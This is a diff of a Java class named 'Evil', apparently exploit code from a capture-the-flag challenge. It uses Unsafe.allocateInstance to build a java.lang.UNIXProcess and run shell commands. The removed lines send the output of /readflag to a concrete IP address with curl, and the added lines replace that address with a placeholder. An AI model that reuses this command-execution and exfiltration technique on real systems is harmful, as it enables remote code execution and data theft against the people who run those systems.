@@ -16,8 +16,8 @@ public class Evil {
         Class clazz = Class.forName("java.lang.UNIXProcess");
         Object obj = unsafe.allocateInstance(clazz);
 
-//        String[] cmd = new String[] {"bash", "-c", "curl 43.140.198.45:5000 -d \"`/readflag`\""};
-        String[] cmd = new String[] {"bash", "-c", "curl 43.140.198.45:5000 -d 'hacked by racerz'"};
+//        String[] cmd = new String[] {"bash", "-c", "curl ip:port -d \"`/readflag`\""};
+        String[] cmd = new String[] {"bash", "-c", "curl ip:port -d 'hacked by racerz'"};
 
         byte[][] cmdArgs = new byte[cmd.length - 1][];
         int size = cmdArgs.length;
